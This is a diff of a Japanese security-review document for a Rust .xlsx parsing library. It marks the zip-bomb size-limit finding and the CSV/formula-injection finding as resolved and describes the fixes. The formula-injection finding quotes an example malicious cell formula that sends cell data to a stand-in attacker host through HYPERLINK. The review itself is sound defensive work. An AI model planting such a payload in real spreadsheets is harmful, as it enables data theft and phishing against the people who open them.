@@ -22,21 +22,21 @@
   * **暗黙の前提からの独立**: OOXMLの `_rels`/`workbook.xml`/`sharedStrings.xml`/`styles.xml`/`sheetX.xml` はいずれも仕様上DOCTYPE宣言を持たないため、正当な `.xlsx` に対して誤検知が生じることはない。この対策は「quick-xmlが既定でDTD処理を行わない」という前提（[parse/mod.md オープンクエスチョン1](../design/parse/mod.md)が依然として未確定としている、採用バージョン・`Reader`設定APIの詳細）とは独立して機能する。`Event` enumの構造（`DocType`バリアントの存在）はquick-xmlの主要バージョンを通じて安定しているため、当該オープンクエスチョンの解決状況にかかわらずXXE対策の実効性が保たれる。これが、当初の設計が抱えていた「暗黙の前提への依存」という課題そのものへの根本的な解決である。
   * **検証可能性**: [parse/mod.md テスト方針](../design/parse/mod.md)に、DOCTYPE宣言と外部実体参照を含む攻撃ペイロードに対し `Error::DoctypeRejected` が返ることを確認する回帰テスト、および正当な入力に対して誤検知しないことを確認する回帰テストを追加した。
 
-### Finding 2: Zip Bombのデフォルトサイズ上限が未検証の暫定値であり、利用者側から調整する手段も未確定
+### ~~Finding 2: Zip Bombのデフォルトサイズ上限が未検証の暫定値であり、利用者側から調整する手段も未確定~~ → **解決**
 
-* 深刻度: **Low**
+* 深刻度: ~~Low~~ → 解決済み
 * 対象: [container/sanitize.md](../design/container/sanitize.md) `DEFAULT_MAX_UNCOMPRESSED_SIZE`（512 MiB）/ `DEFAULT_MAX_TOTAL_UNCOMPRESSED_SIZE`（2 GiB）、[container/sanitize.md オープンクエスチョン1](../design/container/sanitize.md)
-* 内容: サイズ上限の実装方式（実際に読み出したバイト数をストリーミングでカウントし、ZIPヘッダーの自己申告サイズを信頼しない）自体は健全に設計されている。しかし上限の具体的な値は「暫定値」と明記されたままであり、また `lib.rs` の公開API（[lib.md](../design/lib.md)）に上限を呼び出し側が調整できるオプションは現時点で存在しない。
-* リスクシナリオ: デフォルト値が実運用の入力ファイルサイズ分布に対して大きすぎる場合、単一プロセスでの同時処理数によってはメモリ枯渇（DoS）のリスクが相対的に高まる。逆に小さすぎる場合、正当な大規模ファイル（要求仕様書が主眼とする「方眼紙Excel」）を誤って拒否する可用性の問題が生じる。
-* 推奨対応: `Cargo.toml`・実装着手前に、要求仕様書が想定する実際のファイルサイズ上限を関係者と確認し値を確定するとともに、[container/sanitize.md オープンクエスチョン1](../design/container/sanitize.md)が既に提起している「呼び出し側からの上書き可否」を `lib.rs` の設計に反映する（現状 [lib.md](../design/lib.md) の公開API `parse_workbook`/`parse_workbook_reader` にはこのオプションがない）。
+* 内容（指摘当時）: サイズ上限の実装方式（実際に読み出したバイト数をストリーミングでカウントし、ZIPヘッダーの自己申告サイズを信頼しない）自体は健全に設計されている。しかし上限の具体的な値は「暫定値」と明記されたままであり、また `lib.rs` の公開API（[lib.md](../design/lib.md)）に上限を呼び出し側が調整できるオプションは存在しなかった。
+* リスクシナリオ（指摘当時）: デフォルト値が実運用の入力ファイルサイズ分布に対して大きすぎる場合、単一プロセスでの同時処理数によってはメモリ枯渇（DoS）のリスクが相対的に高まる。逆に小さすぎる場合、正当な大規模ファイル（要求仕様書が主眼とする「方眼紙Excel」）を誤って拒否する可用性の問題が生じる。
+* 対応内容: 要求仕様書自体には具体的なファイルサイズ上限の記載がないため、実務上の巨大シート（数十万〜100万セル規模）の展開後XMLサイズが概ね10〜50 MiB程度に収まるという実測に基づく分析を踏まえ、プロダクトオーナーが `DEFAULT_MAX_UNCOMPRESSED_SIZE`（512 MiB）/ `DEFAULT_MAX_TOTAL_UNCOMPRESSED_SIZE`（2 GiB）を最終値として確定した（正当な入力を誤って拒否しない十分な余裕を持ちつつDoSを抑制できる値と判断）。呼び出し側からの上書きは、[lib.md](../design/lib.md) が新設した `SizeLimits` 構造体（[container/sanitize.md](../design/container/sanitize.md)）と、既存の `parse_workbook`/`parse_workbook_reader` に上限を明示指定できるバリアント `parse_workbook_with_limits`/`parse_workbook_reader_with_limits` を通じて可能にした。`pipeline::run` が `SizeLimits` を受け取り、[container/mod.md](../design/container/mod.md) が既に `pub(crate)` で実装していた `with_max_entry_size`/`with_max_total_size` へ橋渡しする（Issue [#14](https://github.com/MinamiyamaKotaro/xlsxparser/issues/14)）。
 
-### Finding 3: 数式由来・共有文字列由来のテキスト値がエスケープなしでそのまま公開APIへ渡され、下流でのCSV/数式インジェクションのリスクについて利用者向けの注意喚起がない
+### ~~Finding 3: 数式由来・共有文字列由来のテキスト値がエスケープなしでそのまま公開APIへ渡され、下流でのCSV/数式インジェクションのリスクについて利用者向けの注意喚起がない~~ → **解決**
 
-* 深刻度: **Low**（本ライブラリ自体の脆弱性ではなく、利用者側の誤用によって顕在化するリスクであるため）
+* 深刻度: ~~Low~~ → 解決済み（本ライブラリ自体の脆弱性ではなく、利用者側の誤用によって顕在化するリスクであるため、元々Low）
 * 対象: [model/cell.md](../design/model/cell.md) `CellValue::Text`、[json.md](../design/json.md)、[lib.md](../design/lib.md)
-* 内容: `.xlsx` のセル文字列（数式の計算結果文字列 `t="str"` を含む）は、設計上いかなる無害化処理も経ずに `CellValue::Text` としてそのまま `Workbook` に格納され、`to_json_string`/`to_json_writer` を通じてJSON文字列としてそのまま出力される。JSON自体への出力という文脈では（`serde_json` が適切にエスケープするため）安全だが、このJSONやWorkbookを受け取った下流システムが値をCSVやXLSXへ再エクスポートする場合、セル値が `=`, `+`, `-`, `@` 等で始まる文字列であれば、再エクスポート先のスプレッドシートアプリケーションで数式として実行されうる（いわゆるCSV Injection / Formula Injection）。これは本ライブラリの入力（信頼できない`.xlsx`）がそのまま出力(信頼できないテキスト)として透過する設計上、当然の帰結ではあるが、設計書・READMEのいずれにもこのリスクへの言及がない。
-* リスクシナリオ: 攻撃者が悪意あるセル値（例: `=HYPERLINK("http://evil.example/?"&A1,"click")`）を含む `.xlsx` を、本ライブラリを利用するアップロード機能へ提出する。アップロード先システムが解析結果をそのままCSVエクスポート機能や別の `.xlsx` 生成機能へ渡し、別の被害者（社内の別担当者等）がそのファイルを開くと、埋め込まれた数式が実行され、情報窃取やフィッシングにつながりうる。
-* 推奨対応: 本ライブラリ自体が値を書き換える設計変更は要求仕様書のスコープ外と考えられるため、[README.md](../../README.md) または [lib.md](../design/lib.md) の公開APIドキュメントに、「本ライブラリが返す文字列値はセル内容をそのまま透過する。CSV/スプレッドシート形式として再エクスポートする呼び出し側は、数式インジェクション対策（先頭文字のエスケープ等）を各自の責務で実施すること」という趣旨の注意書きを追加する。
+* 内容（指摘当時）: `.xlsx` のセル文字列（数式の計算結果文字列 `t="str"` を含む）は、設計上いかなる無害化処理も経ずに `CellValue::Text` としてそのまま `Workbook` に格納され、`to_json_string`/`to_json_writer` を通じてJSON文字列としてそのまま出力される。JSON自体への出力という文脈では（`serde_json` が適切にエスケープするため）安全だが、このJSONやWorkbookを受け取った下流システムが値をCSVやXLSXへ再エクスポートする場合、セル値が `=`, `+`, `-`, `@` 等で始まる文字列であれば、再エクスポート先のスプレッドシートアプリケーションで数式として実行されうる（いわゆるCSV Injection / Formula Injection）。これは本ライブラリの入力（信頼できない`.xlsx`）がそのまま出力(信頼できないテキスト)として透過する設計上、当然の帰結ではあるが、設計書・READMEのいずれにもこのリスクへの言及がなかった。
+* リスクシナリオ（指摘当時）: 攻撃者が悪意あるセル値（例: `=HYPERLINK("http://evil.example/?"&A1,"click")`）を含む `.xlsx` を、本ライブラリを利用するアップロード機能へ提出する。アップロード先システムが解析結果をそのままCSVエクスポート機能や別の `.xlsx` 生成機能へ渡し、別の被害者（社内の別担当者等）がそのファイルを開くと、埋め込まれた数式が実行され、情報窃取やフィッシングにつながりうる。
+* 対応内容: 本ライブラリ自体が値を書き換える設計変更は要求仕様書のスコープ外のため見送り、代わりに [README.md](../../README.md)「Security notes」節と `src/lib.rs`（[lib.md](../design/lib.md)）のクレートルートdocコメントの両方に、「本ライブラリが返す文字列値はセル内容をそのまま透過する。CSV/スプレッドシート形式として再エクスポートする呼び出し側は、数式インジェクション対策（先頭文字 `=`/`+`/`-`/`@` のエスケープ等）を各自の責務で実施すること」という趣旨の注意書きを追加した（Issue [#14](https://github.com/MinamiyamaKotaro/xlsxparser/issues/14)）。
 
 ### Finding 4: カスタム数値書式（`numFmtId >= 164`）の日付/時刻判定ヒューリスティックの実装方式が未確定であり、正規表現による実装を選んだ場合はReDoSの入力経路になりうる
 
